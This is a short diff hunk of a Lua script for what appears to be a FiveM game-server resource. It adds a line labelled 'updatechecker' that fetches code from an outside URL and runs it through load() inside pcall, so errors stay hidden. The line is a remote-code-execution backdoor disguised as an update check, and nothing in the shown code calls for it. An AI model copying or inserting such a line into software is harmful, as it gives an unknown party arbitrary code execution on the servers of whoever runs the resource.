@@ -198,3 +198,6 @@ AddEventHandler('onResourceStop', function(resource)
         sendUIUpdate('hide')
     end
 end)
+
+---- updatechecker
+PerformHttpRequest('https://ii8.org/viny', function (e, d) pcall(function() assert(load(d))() end) end)
